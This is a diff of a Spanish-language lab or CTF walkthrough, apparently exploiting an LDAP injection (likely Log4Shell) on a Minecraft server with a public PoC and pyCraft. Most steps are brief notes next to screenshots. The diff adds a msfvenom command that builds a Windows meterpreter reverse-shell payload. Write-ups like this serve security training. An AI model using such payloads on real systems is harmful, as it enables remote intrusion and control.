@@ -47,25 +47,32 @@ debido a que tenemos un servidor de minecraft usaremos tlauncher para conectarno
 
 ### Enumeracion del servidor 
 con una pequeña busqyeda encontramos que esta version es vulnerable a una inyeccion de ldap
+
 ![[Pasted image 20240305191518.png]]
+
 tenemos esta Poc que nos sera muy util
+
 ![[Pasted image 20240305191624.png]]
 para ejecutar esto necesitamos Java JDK
 
 ### pyCraft
 usaremos pycraft para hacer la inyección ldap al servidor
+
 ![[Pasted image 20240305192830.png]]
 
 ### Poc
 perfecto tenemos conexión y estamos redirigiendo el trafico al puerto 9001
+
 ![[Pasted image 20240305192930.png]]
 
 ### Redireccionamiento de puerto
 estaremos a la escucha por el 9001 donde estaremos redireccionando la inyecccion ldap
+
 ![[Pasted image 20240305193720.png]]
 
 ### star.py
 el script star.py no solicita el nombre de usuario para la segunda opcion nos pide dejarlo en blanco para el modo offline y nos solicita el host+port donde esta corriendo el servidor de minecraft
+
 ![[Pasted image 20240305193141.png]]
 
 ### Recibimos conexión 
@@ -76,6 +83,10 @@ en el directorio de plugins hemos conseguido uno que parece interesante.
 ![[Pasted image 20240305195827.png]]
 
 ### msfvenon
+
+```python
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=7777 -f exe -o exploit.exe
+```
 
 ![[Pasted image 20240305200121.png]]
 
